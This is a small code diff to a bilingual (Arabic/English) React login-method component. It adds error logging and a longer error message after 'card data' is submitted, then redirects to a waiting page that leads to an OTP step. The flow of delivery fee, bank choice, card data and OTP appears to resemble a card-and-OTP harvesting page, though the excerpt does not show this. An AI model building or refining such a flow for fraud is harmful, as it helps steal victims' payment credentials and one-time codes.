@@ -136,9 +136,11 @@ export default function LoginMethod() {
         totalAmount: deliveryMethod === "home" ? "15" : "10",
       });
       
+      // التقدم فقط بعد نجاح الإرسال
       setLocation(`/waiting?bank=${bankId}&session=${currentSessionId}&next=otp`);
     } catch (error) {
-      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred during submission");
+      console.error("Error submitting card data:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "An error occurred during submission. Please try again.");
     }
   };
 
